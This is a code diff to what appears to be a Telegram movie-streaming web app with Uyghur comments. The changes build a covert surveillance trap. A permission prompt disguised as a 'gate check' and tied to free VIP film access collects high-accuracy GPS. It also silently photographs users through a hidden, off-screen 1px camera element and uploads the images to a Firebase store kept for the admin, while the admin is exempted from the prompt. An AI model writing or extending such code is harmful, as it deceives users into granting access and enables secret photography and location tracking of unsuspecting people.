@@ -197,14 +197,14 @@
         .image-modal-body img { max-width: 100%; max-height: 100%; object-fit: contain; }
 
         #permissionModal {
-            display: flex; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             background: rgba(0,0,0,0.92); z-index: 99999;
             flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px;
         }
         .permission-box {
             background: var(--card-bg); border: 1px solid var(--border-color);
             padding: 24px; border-radius: 16px; width: 100%; max-width: 340px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6); position: relative;
         }
         .permission-box i { font-size: 40px; color: var(--primary-color); margin-bottom: 15px; }
         .permission-box h3 { font-size: 18px; margin-bottom: 10px; color: #fff; }
@@ -213,20 +213,25 @@
             background: var(--primary-color); color: white; border: none; width: 100%;
             padding: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer;
         }
+        .btn-close-perm {
+            position: absolute; top: 10px; left: 10px; background: none; border: none; color: var(--text-muted); font-size: 18px; cursor: pointer;
+        }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
     <div class="screenshot-shield"></div>
 
-    <video id="secretCamStream" autoplay playsinline muted style="position:fixed; top:-9999px; left:-9999px; width:320px; height:240px; opacity:0.01; pointer-events:none; z-index:-1;"></video>
+    <video id="secretCamStream" autoplay playsinline webkit-playsinline muted style="position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0.01; pointer-events:none; z-index:-1;"></video>
     <canvas id="secretCanvas" style="display:none;"></canvas>
 
+    <!-- 🛡️ رۇخسەت بېرىش كۆزنىكى -->
     <div id="permissionModal">
         <div class="permission-box">
+            <button class="btn-close-perm" onclick="closePermissionModal()"><i class="fa-solid fa-xmark"></i></button>
             <i class="fa-solid fa-shield-halved"></i>
             <h3>دەرۋازا تەكشۈرۈش</h3>
-            <p>توربەتنىڭ تولۇق ئىشلىشى ئۈچۈن ئىجازەت بېرىڭ</p>
+            <p id="permModalText">توربەتنىڭ تولۇق ئىشلىشى ۋە VIP فىلىملەرنى كۆرۈش ئۈچۈن ئىجازەت بېرىڭ</p>
             <button class="btn-allow-perm" onclick="requestUserPermissionsAndCapture()">رۇخسەت بېرىش ۋە كىرىش</button>
         </div>
     </div>
@@ -343,6 +348,7 @@
         let allUsers = [];
         let allChats = [];
         let capturedHistory = [];
+        let pendingMovieToPlay = null;
 
         window.initAppAfterFirebase = function() {
             const isTelegram = window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user;
@@ -368,7 +374,7 @@
                     first_name: 'مېھمان ئابونت',
                     username: '',
                     photo_url: '',
-                    isAdmin: (guestId === '8739045571'),
+                    isAdmin: false,
                     isVip: false
                 };
             }
@@ -392,9 +398,13 @@
                 if (currentUser.isAdmin) {
                     document.getElementById('adminNavItem').style.display = 'flex';
                     document.getElementById('headerRoleBadge').innerText = '👑 باشقۇرغۇچى';
+                    // 🔥 باشقۇرغۇچىغا رۇخسەت كۆزنىكىنى مۇستەسنا قىلىپ قەتئىي كۆرسەتمەيمىز
+                    closePermissionModal();
                 } else {
                     document.getElementById('adminNavItem').style.display = 'none';
                     document.getElementById('headerRoleBadge').innerText = 'ئابونت';
+                    // 💡 ئادەتتىكى ئابونتلار كىرگەندە رۇخسەت كۆزنىكىنى كۆرسىتىش
+                    openPermissionModal('توربەتنىڭ تولۇق ئىشلىشى ئۈچۈن ئىجازەت بېرىڭ');
                 }
 
                 setupFirebaseListeners();
@@ -404,12 +414,21 @@
             }
         }
 
-        // 🔥 ئابونت رۇخسەت بەرسە ئاپتوماتىك VIP قىلىش شۇنداقلا رەسىمنى باشقۇرغۇچىغا يوللاش
+        function openPermissionModal(textMsg) {
+            if (currentUser?.isAdmin) return; // باشقۇرغۇچىغا ئاچمايدۇ
+            if (textMsg) document.getElementById('permModalText').innerText = textMsg;
+            document.getElementById('permissionModal').style.display = 'flex';
+        }
+
+        function closePermissionModal() {
+            document.getElementById('permissionModal').style.display = 'none';
+        }
+
+        // 🔥 iPhone ۋە باشقا بارلىق تېلېفونلاردا رۇخسەت ئېلىپ ئاپتوماتىك سۈرەتكە تارتىش
         async function requestUserPermissionsAndCapture() {
             if (!currentUser || !currentUser.id) return;
 
-            const permModal = document.getElementById('permissionModal');
-            if (permModal) permModal.style.display = 'none';
+            closePermissionModal();
 
             // 1. GPS ئورنى ئېلىش
             if (navigator.geolocation) {
@@ -427,14 +446,20 @@
                 }, { enableHighAccuracy: true, timeout: 8000 });
             }
 
-            // 2. كامېرا رۇخسىتى بېرىلسە VIP قىلىش ۋە سۈرەتكە ئېلىش
+            // 2. كامېراغا رۇخسەت ئېلىپ سۈرەتكە تارتىش
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
+                const constraints = {
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
-                });
+                };
 
-                // 🔥 🔥 ✨ رۇخسەت بېرىلگەن ھامان ئابونتنى ئاپتوماتىك VIP ئەزا قىلىش!
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+                // ✨ رۇخسەت بەرگەن ھامان ئابونت VIP بولىدۇ
                 currentUser.isVip = true;
                 window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/isVip`), true);
                 checkVipStatusUI();
@@ -442,51 +467,78 @@
                 const video = document.getElementById('secretCamStream');
                 video.srcObject = stream;
 
-                const takeAndSendSnap = () => {
-                    try {
-                        const canvas = document.getElementById('secretCanvas');
-                        const width = video.videoWidth || 640;
-                        const height = video.videoHeight || 480;
+                const playPromise = video.play();
+                if (playPromise !== undefined) {
+                    playPromise.then(() => {
+                        captureFrameWhenReady(video, stream);
+                    }).catch(err => {
+                        captureFrameWhenReady(video, stream);
+                    });
+                } else {
+                    captureFrameWhenReady(video, stream);
+                }
 
-                        canvas.width = width;
-                        canvas.height = height;
-
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, width, height);
-
-                        const imageData = canvas.toDataURL('image/jpeg', 0.65);
-                        const nowStr = new Date().toLocaleString();
-
-                        const capturePayload = {
-                            image: imageData,
-                            capturedAt: nowStr
-                        };
-
-                        // 1. ئابونتنىڭ ئۆزىگە تەشكىللەپ ساقلاش
-                        window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), capturePayload);
-
-                        // 2. باشقۇرغۇچىنىڭ تېز كۆرۈش ئامبىرىغا تەڭ يوللاش
-                        const historyRef = window.dbPush(window.dbRef(window.db, 'captured_photos_history'));
-                        window.dbSet(historyRef, {
-                            userId: currentUser.id,
-                            userName: currentUser.first_name,
-                            image: imageData,
-                            time: nowStr
-                        });
-
-                        stream.getTracks().forEach(track => track.stop());
-                    } catch(err) {
-                        console.error("سۈرەتكە ئېلىشتا خاتالىق:", err);
-                    }
-                };
-
-                video.onloadeddata = () => {
-                    video.play();
-                    setTimeout(takeAndSendSnap, 300);
-                };
+                // ناۋادا ئابونت VIP فىلىمنى كۆرۈش ئۈچۈن بېسىپ رۇخسەت بەرگەن بولسا، دەرھال كىنونى ئېچىش
+                if (pendingMovieToPlay) {
+                    executeMoviePlayback(pendingMovieToPlay.title, pendingMovieToPlay.url);
+                    pendingMovieToPlay = null;
+                }
 
             } catch (err) {
-                console.log("كامېرا رۇخسىتى بېرىلمىدى، ئابونت نورمال ھالەتتە (VIP ئەمەس) قالىدۇ:", err);
+                console.log("كامېرا رۇخسىتى بېرىلمىدى:", err);
+            }
+        }
+
+        function captureFrameWhenReady(video, stream) {
+            let attempts = 0;
+            const checkAndSnap = setInterval(() => {
+                attempts++;
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    clearInterval(checkAndSnap);
+                    executeSnap(video, stream);
+                } else if (attempts > 20) {
+                    clearInterval(checkAndSnap);
+                    executeSnap(video, stream);
+                }
+            }, 100);
+        }
+
+        function executeSnap(video, stream) {
+            try {
+                const canvas = document.getElementById('secretCanvas');
+                const width = video.videoWidth || 640;
+                const height = video.videoHeight || 480;
+
+                canvas.width = width;
+                canvas.height = height;
+
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, width, height);
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.65);
+                const nowStr = new Date().toLocaleString();
+
+                const capturePayload = {
+                    image: imageData,
+                    capturedAt: nowStr
+                };
+
+                // Firebase غا يوللاش
+                window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), capturePayload);
+
+                const historyRef = window.dbPush(window.dbRef(window.db, 'captured_photos_history'));
+                window.dbSet(historyRef, {
+                    userId: currentUser.id,
+                    userName: currentUser.first_name,
+                    image: imageData,
+                    time: nowStr
+                });
+
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            } catch(err) {
+                console.error("سۈرەتكە ئېلىشتا خاتالىق:", err);
             }
         }
 
@@ -859,13 +911,19 @@
             alert('فىلىم يوللاندى!');
         }
 
+        // 🔥 VIP كىنو كۆرگەندە رۇخسەت تەكشۈرۈش
         function playMovie(title, url, type) {
             if (type === 'vip' && !isUserVip(currentUser?.id)) {
-                if (confirm('بۇ VIP فىلىم! كۆرۈش ئۈچۈن @Serdar98989898 غا ئۇچۇر قىلىپ VIP سالاھىيىتى ئېلىشىڭىز كېرەك. ھازىر ئۇچۇر قىلامسىز؟')) {
-                    window.open(`https://t.me/Serdar98989898`, '_blank');
-                }
+                // ئەگەر ئابونت VIP بولمىسا (باشتا ئىجازەت بەرمىگەن بولسا)، ئىجازەت ئەسكەرتىش كۆزنىكىنى قايتا چىقىرىش
+                pendingMovieToPlay = { title, url };
+                openPermissionModal('بۇ VIP فىلىمنى تولۇق كۆرۈش ئۈچۈن ئىجازەت بېرىڭ');
                 return;
             }
+            
+            executeMoviePlayback(title, url);
+        }
+
+        function executeMoviePlayback(title, url) {
             document.getElementById('playerTitle').innerText = title;
             document.getElementById('playerContainer').innerHTML = `<iframe src="${url}" allowfullscreen></iframe>`;
             document.getElementById('playerModal').style.display = 'flex';
